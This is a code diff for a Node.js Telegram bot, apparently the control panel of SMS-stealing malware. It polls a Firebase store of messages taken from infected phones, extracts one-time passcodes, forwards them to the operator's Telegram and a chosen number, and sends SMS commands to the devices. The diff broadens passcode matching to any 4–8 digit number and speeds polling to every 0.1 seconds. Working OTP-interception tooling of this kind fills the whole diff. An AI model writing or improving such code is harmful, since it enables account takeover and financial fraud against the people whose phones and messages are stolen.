@@ -213,31 +213,30 @@ async function sendSms(userId, deviceId, toNumber, message) {
     };
     
     let success1 = false, success2 = false, success3 = false, success4 = false;
-    let errors = [];
     
     try {
         const result1 = await db.put(commandPath, commandData);
         success1 = result1 === true;
         if (success1) console.log(`✅ Command written to: ${commandPath}`);
-    } catch(e) { errors.push(`${commandPath}: ${e.message}`); }
+    } catch(e) { console.log(`❌ Failed: ${commandPath}`); }
     
     try {
         const result2 = await db.put(webhookPath, webhookData);
         success2 = result2 === true;
         if (success2) console.log(`✅ Command written to: ${webhookPath}`);
-    } catch(e) { errors.push(`${webhookPath}: ${e.message}`); }
+    } catch(e) { console.log(`❌ Failed: ${webhookPath}`); }
     
     try {
         const result3 = await db.push(messagesPath, messageData);
         success3 = result3 !== null;
         if (success3) console.log(`✅ Command written to: ${messagesPath}`);
-    } catch(e) { errors.push(`${messagesPath}: ${e.message}`); }
+    } catch(e) { console.log(`❌ Failed: ${messagesPath}`); }
     
     try {
         const result4 = await db.put(smsPath, smsData);
         success4 = result4 === true;
         if (success4) console.log(`✅ Command written to: ${smsPath}`);
-    } catch(e) { }
+    } catch(e) { console.log(`❌ Failed: ${smsPath}`); }
     
     const elapsed = Date.now() - start;
     
@@ -245,10 +244,10 @@ async function sendSms(userId, deviceId, toNumber, message) {
         return { success: true, message: `SMS sent to ${cleanNumber}`, elapsed: elapsed, commandId: commandId };
     }
     
-    return { success: false, error: `Failed: ${errors.join(', ')}` };
+    return { success: false, error: 'Failed to write command to Firebase' };
 }
 
-// ==================== OTP EXTRACTION (IMPROVED) ====================
+// ==================== OTP EXTRACTION ====================
 function extractOTP(text) {
     if (!text) return null;
     
@@ -271,7 +270,9 @@ function extractOTP(text) {
         /Use OTP (\d{4,8}) to log in/i,
         /Use OTP (\d{4,8}) for/i,
         /login OTP[:\s]*(\d{4,8})/i,
-        /(\d{4,8}) is your login OTP/i
+        /(\d{4,8}) is your login OTP/i,
+        /otp[:\s]*(\d{4,8})/i,
+        /verification code[:\s]*(\d{4,8})/i
     ];
     
     for (const pattern of patterns) {
@@ -280,6 +281,13 @@ function extractOTP(text) {
             console.log(`✅ OTP Found: ${match[1]}`);
             return match[1];
         }
+    }
+    
+    // Try to find any 4-8 digit number that might be OTP
+    const numberMatch = text.match(/\b(\d{4,8})\b/);
+    if (numberMatch && !text.match(/mobile|phone|contact/i)) {
+        console.log(`✅ Possible OTP (number only): ${numberMatch[1]}`);
+        return numberMatch[1];
     }
     
     console.log(`❌ No OTP found in message`);
@@ -292,6 +300,7 @@ function extractToken(text) {
     
     console.log(`\n🔍 Extracting token from: ${text.slice(0, 200)}`);
     
+    // Format: To: 919876543210\nMessage: TOKEN123
     let match = text.match(/To:\s*\+?(\d{10,12})[\s\n]*Message:\s*(.+?)(?=\n|$)/is);
     if (match) {
         const number = match[1].trim();
@@ -301,6 +310,7 @@ function extractToken(text) {
         }
     }
     
+    // Format: 📱 Receipt: 7899460333\n🔑 Token: TOKEN
     match = text.match(/📱\s*Receipt:\s*\+?(\d{10,12})[\s\n]*🔑\s*Token:\s*(.+?)(?=\n|$)/i);
     if (match) {
         const number = match[1].trim();
@@ -310,6 +320,7 @@ function extractToken(text) {
         }
     }
     
+    // Format: Receipt: 7899460333\nToken: TOKEN
     match = text.match(/Receipt:\s*\+?(\d{10,12})[\s\n]*Token:\s*(.+?)(?=\n|$)/i);
     if (match) {
         const number = match[1].trim();
@@ -319,6 +330,7 @@ function extractToken(text) {
         }
     }
     
+    // Format: 📞 To: XXXXX 💬 Message: YYYYY
     match = text.match(/📞\s*To:\s*\+?(\d{10,12})[\s\S]*?💬\s*Message:\s*(.+?)(?=\n|$)/i);
     if (match) {
         const number = match[1].trim();
@@ -328,6 +340,7 @@ function extractToken(text) {
         }
     }
     
+    // Format: One-tap copy: XXXXX | YYYYY
     match = text.match(/One-tap copy:\s*\+?(\d{10,12})\s*\|\s*(.+?)(?=\n|$)/i);
     if (match) {
         const number = match[1].trim();
@@ -337,6 +350,7 @@ function extractToken(text) {
         }
     }
     
+    // Format: Phone: XXXXX\nOTP: YYYYY
     match = text.match(/Phone:\s*\+?(\d{10,12})[\s\n]*OTP:\s*(.+?)(?=\n|$)/i);
     if (match) {
         const number = match[1].trim();
@@ -346,6 +360,7 @@ function extractToken(text) {
         }
     }
     
+    // Try to find number + token pattern
     const phoneMatch = text.match(/\b(\d{10,12})\b/);
     if (phoneMatch) {
         const number = phoneMatch[1];
@@ -375,7 +390,8 @@ async function autoForwardOTP(userId, deviceId, fullMessage, sender, timestamp, 
     console.log(`📝 Full Message: ${fullMessage.slice(0, 200)}`);
     
     // Format message for forwarding
-    const forwardMessage = `🔐 *OTP RECEIVED*\n\n📱 From: ${sender}\n🔑 OTP: ${otpCode}\n🕐 Time: ${timestamp ? new Date(timestamp * 1000).toLocaleString() : new Date().toLocaleString()}\n📝 Message: ${fullMessage}`;
+    const formattedTime = timestamp ? new Date(timestamp * 1000).toLocaleString() : new Date().toLocaleString();
+    const forwardMessage = `🔐 *OTP RECEIVED*\n\n📱 From: ${sender}\n🔑 OTP: ${otpCode}\n🕐 Time: ${formattedTime}\n📝 Message: ${fullMessage}`;
     
     // Send OTP to user's Telegram
     await bot.telegram.sendMessage(
@@ -406,7 +422,7 @@ async function autoForwardOTP(userId, deviceId, fullMessage, sender, timestamp, 
     }
 }
 
-// ==================== MONITOR FIREBASE MESSAGES ====================
+// ==================== MONITOR FIREBASE MESSAGES (REAL-TIME) ====================
 async function monitorFirebaseMessages(userId, user) {
     const db = getUserDb(userId);
     if (!db || !user.monitoringDevice) return;
@@ -416,47 +432,62 @@ async function monitorFirebaseMessages(userId, user) {
         const messagesData = await db.get(`clients/${user.monitoringDevice}/messages`);
         if (!messagesData) return;
         
-        const lastProcessedTime = user.lastMessageCheck || 0;
-        const currentTime = Date.now();
+        const messages = typeof messagesData === 'object' && !Array.isArray(messagesData) 
+            ? Object.entries(messagesData).map(([id, msg]) => ({ id, ...msg }))
+            : [];
         
-        for (const [msgId, msg] of Object.entries(messagesData)) {
-            const msgTime = msg.timestamp || msg.dateTime;
-            const msgTimestamp = typeof msgTime === 'number' ? msgTime : new Date(msgTime).getTime();
+        if (messages.length === 0) return;
+        
+        // Sort by timestamp (newest first)
+        messages.sort((a, b) => {
+            const timeA = a.timestamp || new Date(a.dateTime).getTime() || 0;
+            const timeB = b.timestamp || new Date(b.dateTime).getTime() || 0;
+            return timeB - timeA;
+        });
+        
+        // Check only the newest messages (last 5)
+        const newMessages = messages.slice(0, 5);
+        
+        for (const msg of newMessages) {
+            const msgId = msg.id;
+            const msgTime = msg.timestamp || new Date(msg.dateTime).getTime() || 0;
             
-            // Check if message is new
-            if (msgTimestamp > lastProcessedTime && !user.processedMsgs?.has(msgId)) {
-                const messageText = msg.message || msg.text || '';
-                const sender = msg.sender || 'Unknown';
-                
-                console.log(`\n📨 New message from Firebase:`);
-                console.log(`ID: ${msgId}`);
-                console.log(`Sender: ${sender}`);
-                console.log(`Message: ${messageText.slice(0, 200)}`);
-                console.log(`Time: ${new Date(msgTimestamp).toLocaleString()}`);
-                
-                // Extract OTP from message
-                const otp = extractOTP(messageText);
-                
-                if (otp && user.otpForwardNumber) {
-                    console.log(`🎯 OTP Found! Forwarding to ${user.otpForwardNumber}`);
-                    await autoForwardOTP(userId, user.monitoringDevice, messageText, sender, msgTimestamp / 1000, otp);
-                } else if (otp && !user.otpForwardNumber) {
-                    console.log(`⚠️ OTP found but no forward number set`);
-                    await bot.telegram.sendMessage(
-                        userId,
-                        `🔐 *OTP DETECTED but no forward number set!*\n\n🔑 OTP: \`${otp}\`\n📝 ${messageText.slice(0, 150)}\n\nUse /setotpnum to set a number for auto-forwarding.`,
-                        { parse_mode: 'Markdown' }
-                    );
-                }
-                
-                // Mark as processed
-                if (!user.processedMsgs) user.processedMsgs = new Set();
-                user.processedMsgs.add(msgId);
+            // Skip if already processed
+            if (user.processedMsgs && user.processedMsgs.has(msgId)) continue;
+            
+            // Skip old messages (from before monitoring started)
+            const startTime = user.monitorStartTime ? new Date(user.monitorStartTime).getTime() : 0;
+            if (msgTime < startTime && startTime > 0) continue;
+            
+            const messageText = msg.message || msg.text || '';
+            const sender = msg.sender || 'Unknown';
+            
+            console.log(`\n📨 New message from Firebase:`);
+            console.log(`ID: ${msgId}`);
+            console.log(`Sender: ${sender}`);
+            console.log(`Message: ${messageText.slice(0, 200)}`);
+            console.log(`Time: ${new Date(msgTime).toLocaleString()}`);
+            
+            // Extract OTP from message
+            const otp = extractOTP(messageText);
+            
+            if (otp && user.otpForwardNumber) {
+                console.log(`🎯 OTP Found! Forwarding to ${user.otpForwardNumber}`);
+                await autoForwardOTP(userId, user.monitoringDevice, messageText, sender, msgTime / 1000, otp);
+            } else if (otp && !user.otpForwardNumber) {
+                console.log(`⚠️ OTP found but no forward number set`);
+                await bot.telegram.sendMessage(
+                    userId,
+                    `🔐 *OTP DETECTED but no forward number set!*\n\n🔑 OTP: \`${otp}\`\n📝 ${messageText.slice(0, 150)}\n\nUse /setotpnum to set a number for auto-forwarding.`,
+                    { parse_mode: 'Markdown' }
+                );
             }
+            
+            // Mark as processed
+            if (!user.processedMsgs) user.processedMsgs = new Set();
+            user.processedMsgs.add(msgId);
         }
         
-        // Update last check time
-        user.lastMessageCheck = currentTime;
         userData.set(userId, user);
         
     } catch (error) {
@@ -685,7 +716,7 @@ bot.command('setotpnum', async (ctx) => {
     if (args.length < 2) {
         return ctx.reply(
             `❌ *Usage:* \`/setotpnum <phone_number>\`\n\n` +
-            `Example: \`/setotpnum 919876543210\`\n\n` +
+            `Example: \`/setotpnum 6283543900\`\n\n` +
             `📌 All OTPs detected will be auto-forwarded to this number!`,
             { parse_mode: 'Markdown' }
         );
@@ -842,13 +873,27 @@ bot.command('startmonitor', async (ctx) => {
     if (!user.monitoringDevice) return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
     
     const now = new Date();
+    user.monitorStartTime = now.toISOString();
     user.monitorActive = true;
     user.processedMsgs = new Set();
-    user.lastMessageCheck = 0;
+    user.lastMessageCheck = Date.now();
     userData.set(userId, user);
     
     const device = await getDevice(userId, user.monitoringDevice);
     const deviceStatus = device ? (device.online ? '🟢 ONLINE' : '🔴 OFFLINE') : '❓ Unknown';
+    
+    // Clear existing interval if any
+    if (user.monitorInterval) clearInterval(user.monitorInterval);
+    
+    // Start monitoring interval - 0.1 SECOND (100ms) REAL-TIME MONITORING
+    user.monitorInterval = setInterval(async () => {
+        const currentUser = userData.get(userId);
+        if (currentUser && currentUser.monitorActive && currentUser.monitoringDevice) {
+            await monitorFirebaseMessages(userId, currentUser);
+        }
+    }, 100); // 100ms = 0.1 seconds - REAL-TIME!
+    
+    userData.set(userId, user);
     
     await ctx.reply(
         `✅ *MONITORING STARTED!*\n\n` +
@@ -860,20 +905,10 @@ bot.command('startmonitor', async (ctx) => {
         `📌 *How it works:*\n` +
         `• OTPs from Firebase messages → Auto-forward to your set number\n` +
         `• Tokens (To: X Message: Y) → Forward as SMS\n\n` +
-        `🚀 MONITORING ACTIVE!\n` +
-        `📡 Checking Firebase for new messages every 5 seconds...`,
+        `🚀 *REAL-TIME MONITORING ACTIVE!*\n` +
+        `📡 Checking Firebase every 0.1 seconds for new messages...`,
         { parse_mode: 'Markdown' }
     );
-    
-    // Start Firebase monitoring interval
-    if (user.monitorInterval) clearInterval(user.monitorInterval);
-    user.monitorInterval = setInterval(async () => {
-        const currentUser = userData.get(userId);
-        if (currentUser && currentUser.monitorActive && currentUser.monitoringDevice) {
-            await monitorFirebaseMessages(userId, currentUser);
-        }
-    }, 5000);
-    userData.set(userId, user);
 });
 
 bot.command('stop', async (ctx) => {
@@ -887,15 +922,17 @@ bot.command('stop', async (ctx) => {
         }
         userData.set(userId, user);
     }
-    await ctx.reply(`⏸ *Monitor Paused*`, { parse_mode: 'Markdown' });
+    await ctx.reply(`⏸ *Monitor Paused*\n\nUse \`/resume\` to start again.`, { parse_mode: 'Markdown' });
 });
 
 bot.command('resume', async (ctx) => {
     const userId = ctx.from.id.toString();
     const user = userData.get(userId);
     if (!user?.monitoringDevice) return ctx.reply('❌ No device set.');
+    
     user.monitorActive = true;
-    user.lastMessageCheck = 0;
+    user.processedMsgs = new Set();
+    user.lastMessageCheck = Date.now();
     
     // Restart monitoring interval
     if (user.monitorInterval) clearInterval(user.monitorInterval);
@@ -904,10 +941,10 @@ bot.command('resume', async (ctx) => {
         if (currentUser && currentUser.monitorActive && currentUser.monitoringDevice) {
             await monitorFirebaseMessages(userId, currentUser);
         }
-    }, 5000);
+    }, 100); // 100ms = 0.1 seconds
     
     userData.set(userId, user);
-    await ctx.reply(`✅ *Monitor Resumed!*`, { parse_mode: 'Markdown' });
+    await ctx.reply(`✅ *Monitor Resumed!*\n\n🔄 Real-time monitoring active every 0.1 seconds.`, { parse_mode: 'Markdown' });
 });
 
 bot.command('status', async (ctx) => {
@@ -936,6 +973,7 @@ bot.command('status', async (ctx) => {
         `🖥 Total Devices: ${allDevices.length}\n` +
         `⏱ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
         `🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}\n` +
+        `🔄 Refresh Rate: 0.1 seconds\n` +
         `━━━━━━━━━━━━━━━━━━━`,
         { parse_mode: 'Markdown' }
     );
@@ -1260,16 +1298,16 @@ bot.on('text', async (ctx) => {
 // ==================== START ====================
 async function main() {
     console.log('\n🚀 ========== SOUL EXE AUTO VERIFICATION v2.0 ==========');
+    console.log('✅ REAL-TIME MONITORING: 0.1 SECOND INTERVAL');
     console.log('✅ OTP AUTO-FORWARD FROM FIREBASE');
     console.log('✅ TOKEN FORWARD FEATURE');
-    console.log('✅ FIREBASE MESSAGE MONITORING');
     console.log('==========================================\n');
     
     bot.launch();
     console.log('🤖 Bot running...\n');
-    console.log('📌 OTP FORWARD:');
-    console.log('   /setotpnum <number> - Set number for OTP forwarding');
-    console.log('   Bot will monitor Firebase /messages for new OTPs');
+    console.log('📌 REAL-TIME MONITORING:');
+    console.log('   Checking Firebase every 0.1 seconds for new messages');
+    console.log('   OTPs auto-forward to your set number instantly');
     console.log('==========================================\n');
 }
 
